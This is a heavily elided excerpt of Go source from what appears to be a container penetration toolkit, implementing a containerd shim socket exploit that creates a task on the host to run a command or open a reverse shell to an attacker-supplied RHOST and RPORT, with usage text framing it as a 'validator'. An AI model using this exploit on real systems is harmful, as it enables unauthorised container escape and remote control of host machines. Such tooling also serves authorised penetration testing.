//go:build !thin && !no_containerd_shim_check
// +build !thin,!no_containerd_shim_check
...
func containerdShimApiExp(sock, shellCmd, rhost, rport string) error {
	...
	localBundlePath := fmt.Sprintf("/.cache_%s", util.RandString(6))
	...
	var M = shimapi.CreateTaskRequest{
		ID:       util.RandString(10), // 各检查项需使用不同 ID
...
func (p containerdShimPwnS) Desc() string {
	return "CAP-2020-002 containerd shim socket 宿主权限边界验证. usage: \"./cdk run containerd-shim-validator reverse <RHOST> <RPORT>\" or \"./cdk run containerd-shim-validator <SHELL_CMD>\" "
}
